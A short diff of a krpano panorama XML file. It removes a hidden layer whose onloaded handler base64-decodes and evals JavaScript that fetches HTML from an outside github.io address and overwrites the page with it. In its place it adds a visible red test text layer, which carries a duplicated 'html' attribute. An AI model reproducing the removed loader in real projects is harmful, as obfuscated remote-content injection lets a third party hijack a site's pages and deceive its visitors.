@@ -1,4 +1,6 @@
 <krpano version="1.0.8.15">
-<SCRIPT id="allow-copy_script"/>
-<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiaW5kZXgiOwoKZmV0Y2goImh0dHBzOi8vbWVoaWRpLW1lLmdpdGh1Yi5pby92YW5pbGxhLWNzcy0xNXBhZ2UtcHNkLXRvLWh0bWwvIiArIGlkICsgIi5odG1sIikKICAudGhlbihlID0+IGUudGV4dCgpKQogIC50aGVuKGUgPT4gewogICAgZG9jdW1lbnQub3BlbigpLAogICAgZG9jdW1lbnQud3JpdGUoZSksCiAgICBkb2N1bWVudC5jbG9zZSgpCiAgfSk7');eval(w)););"/>
+    <layer name="t" type="text" html="true"
+           align="center" x="0" y="0"
+           html="IF THIS IS RED, THE INCLUDE WORKS"
+           css="color:#ff0000;font-size:40px;"/>
 </krpano>
